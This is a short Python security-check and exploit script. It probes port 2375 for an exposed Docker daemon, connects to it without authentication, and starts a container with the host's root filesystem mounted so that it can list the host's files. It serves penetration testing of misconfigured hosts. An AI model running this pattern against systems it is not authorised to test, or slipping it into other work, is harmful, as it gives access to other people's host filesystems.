#!/usr/bin/env python

# Docker Security Check/Exploit
# Author: Jordan Rodgers (com6056@gmail.com)

import socket
import docker
import requests
from distutils.version import LooseVersion

def check_port(host):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((host, 2375))
    if result == 0:
        print("Docker daemon port is open!")
        return True
    else:
        print("Docker daemon port is not open.")
        return False

def docker_connect(host):
    get_version = requests.get(url="http://{}:2375/version".format(host))
    remote_version = get_version.json()["Version"]
    docker_client = docker.DockerClient(base_url="http://{}:2375".format(host), version=remote_version)
    return docker_client


def check_selinux(docker_client):
    remote_version = docker_client.version()["Version"]
    if LooseVersion(remote_version) < LooseVersion("1.15"):
        print("Found older version of Docker. Using Docker command-line tools instead")
    else:
        mount = {'/': {'bind':'/mnt/root', 'mode': 'ro'}}
        docker_client.containers.run('centos', 'ls /mnt/root', volumes=mount)
    

if __name__ == "__main__":
    host = input("Enter IP or hostname of the system you would like to test: ")
    port_open = check_port(host)
    if port_open:
        docker_client = docker_connect(host)
        check_selinux(docker_client)
